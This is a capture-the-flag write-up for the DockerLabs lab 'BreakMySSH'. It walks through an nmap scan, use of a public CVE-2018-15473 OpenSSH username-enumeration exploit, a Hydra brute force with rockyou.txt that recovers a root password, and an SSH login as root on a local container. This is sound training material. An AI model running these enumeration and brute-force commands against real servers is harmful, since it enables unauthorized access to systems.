# BreakMySSH

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| BreakMySSH | El Pingüino de Mario | Very Easy | dockerlabs |

**Summary:** This machine presents a deceptively minimalist attack surface: a single exposed port running an outdated version of OpenSSH. The vulnerability chain begins with reconnaissance that identifies OpenSSH 7.7 on port 22, a version affected by CVE-2018-15473, a well-documented username enumeration flaw rooted in the way the SSH daemon handles public-key authentication requests differently for valid versus invalid usernames. By exploiting this timing and response discrepancy, an attacker can confirm the existence of the `root` account without any credentials. With a confirmed valid target username in hand, the engagement pivots to a credential brute-force phase using Hydra against the `rockyou.txt` wordlist, which rapidly recovers the plaintext password `estrella`. The combination of a confirmed username and a weak password is sufficient to authenticate directly over SSH as the `root` user, granting immediate, unrestricted superuser access to the container. There is no lateral movement required and no secondary privilege escalation step: the OpenSSH enumeration flaw collapses the authentication boundary entirely, converting an anonymous probe into a root shell in a matter of seconds once the password is recovered.

---

## Reconnaissance

The lab is brought online using the provided deployment script, which provisions the Docker container and assigns it the IP address `172.17.0.2`.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~/dockerlabs/breakmyssh]
└─$ sudo bash auto_deploy.sh breakmyssh.tar

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

With the target address confirmed, a shell variable is set for convenience and a full port scan is launched with service version detection and default script enumeration.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/breakmyssh]
└─$ ip=172.17.0.2 && url=http://$ip

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/breakmyssh]
└─$ nmap -sC -sV -p- -T4 $ip
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-10 19:01 +07
Nmap scan report for 172.17.0.2
Host is up (0.0000080s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.7 (protocol 2.0)
| ssh-hostkey:
|   2048 1a:cb:5e:a3:3d:d1:da:c0:ed:2a:61:7f:73:79:46:ce (RSA)
|   256 54:9e:53:23:57:fc:60:1e:c0:41:cb:f3:85:32:01:fc (ECDSA)
|_  256 4b:15:7e:7b:b3:07:54:3d:74:ad:e0:94:78:0c:94:93 (ED25519)
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2.78 seconds
```

The scan reveals exactly one open port: TCP 22, running **OpenSSH 7.7**. There is no web application, no FTP service, and no additional attack surface. The entire engagement must proceed through SSH.

---

## Vulnerability Discovery

The exact version string `OpenSSH 7.7` is a critical detail. This version sits right at the boundary of a known username enumeration vulnerability. A `searchsploit` query is used to identify any public exploits targeting this version.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/breakmyssh]
└─$ searchsploit openssh 7.7
----------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                 |  Path
----------------------------------------------------------------------------------------------- ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration                                                       | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                                 | linux/remote/45210.py
OpenSSH < 7.7 - User Enumeration (2)                                                           | linux/remote/45939.py
----------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Three relevant entries appear, all targeting **CVE-2018-15473**, a username enumeration flaw present in OpenSSH versions prior to 7.7. The exploit `45939.py` (the second variant of the User Enumeration PoC) is selected and mirrored into the working directory.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/breakmyssh]
└─$ searchsploit -m linux/remote/45939.py
  Exploit: OpenSSH < 7.7 - User Enumeration (2)
      URL: https://www.exploit-db.com/exploits/45939
     Path: /usr/share/exploitdb/exploits/linux/remote/45939.py
    Codes: CVE-2018-15473
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /tmp/breakmyssh/45939.py
```

A quick help check confirms the script's usage signature: it requires a target IP and a username to probe.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/breakmyssh]
└─$ python2 45939.py -h
/home/ouba/.local/lib/python2.7/site-packages/paramiko/transport.py:33: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
  from cryptography.hazmat.backends import default_backend
usage: 45939.py [-h] [-p PORT] target username

SSH User Enumeration by Leap Security (@LeapSecurity)

positional arguments:
  target                IP address of the target system
  username              Username to check for validity.

optional arguments:
  -h, --help            show this help message and exit
  -p PORT, --port PORT  Set port of SSH service
```

---

## Exploitation

### Step 1: Username Enumeration via CVE-2018-15473

The exploit is run against the target with `root` as the candidate username. The underlying mechanism of CVE-2018-15473 exploits an asymmetry in how the OpenSSH daemon processes malformed public-key authentication packets: when a username exists, the server parses the packet further before rejecting it; when the username does not exist, it rejects the packet earlier. This observable difference in server behaviour allows an attacker to definitively confirm the presence of an account.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/breakmyssh]
└─$ python2 45939.py $ip root
/home/ouba/.local/lib/python2.7/site-packages/paramiko/transport.py:33: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
  from cryptography.hazmat.backends import default_backend
[+] root is a valid username
```

The server confirms that `root` is a valid username. This eliminates the need for any username discovery phase and allows a focused, single-target brute-force attack.

### Step 2: Password Brute-Force via Hydra

With a confirmed valid username, Hydra is directed at the SSH service using the `rockyou.txt` wordlist. Only 4 parallel threads are used to avoid overwhelming the target service.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/breakmyssh]
└─$ hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://$ip -t 4
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-10 19:11:51
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: root   password: estrella
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-10 19:12:04
```

Hydra recovers the password `estrella` in approximately 13 seconds. The credential pair is now complete: `root` / `estrella`.

### Step 3: SSH Access as Root

The recovered credentials are used to authenticate directly to the machine over SSH.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/breakmyssh]
└─$ ssh root@$ip
...
root@172.17.0.2's password:
...
root@49da7b0906cd:~# id;whoami;hostname
uid=0(root) gid=0(root) groups=0(root)
root
49da7b0906cd
```

The session is established immediately with full `root` privileges. The `id` command confirms `uid=0(root) gid=0(root)`, and `whoami` returns `root`. The container hostname is `49da7b0906cd`. Full system ownership is achieved with no further steps required.

---

## Attack Chain Summary

1. **Reconnaissance**: A full TCP port scan with Nmap reveals a single open port, TCP 22, running OpenSSH 7.7. The precise version string is noted as the sole point of interest.

2. **Vulnerability Discovery**: A `searchsploit` query against the identified version surfaces CVE-2018-15473, a username enumeration flaw affecting OpenSSH versions below 7.7. The exploit script `45939.py` is retrieved and staged locally.

3. **Username Enumeration**: The CVE-2018-15473 exploit is executed against the target with `root` as the candidate, and the server confirms the account's existence by revealing a discrepancy in its handling of malformed authentication packets.

4. **Credential Recovery**: With the valid username confirmed, Hydra conducts a dictionary attack against the SSH service using `rockyou.txt`, recovering the weak password `estrella` in under 15 seconds.

5. **Root Access**: The recovered credentials are used to authenticate via SSH directly as `root`, yielding a fully privileged shell with no privilege escalation step necessary.
